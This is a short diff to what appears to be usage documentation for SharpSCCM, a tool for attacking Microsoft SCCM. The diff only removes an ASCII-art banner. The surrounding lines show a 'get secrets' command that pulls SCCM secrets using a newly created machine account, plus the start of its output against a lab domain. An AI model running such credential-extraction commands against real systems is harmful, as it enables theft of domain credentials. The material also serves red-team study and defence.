@@ -52,10 +52,6 @@ Enter a password for the new machine account: ********
 
 .\SharpSCCM.exe get secrets -r newdevice -u chell$ -p <password>
 
-  _______ _     _ _______  ______  _____  _______ _______ _______ _______
-  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
-  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem
-
 [+] Querying the local WMI repository for the current management point and site code
 [+] Connecting to \\127.0.0.1\root\CCM
 [+] Current management point: SITE-SERVER.APERTURE.LOCAL
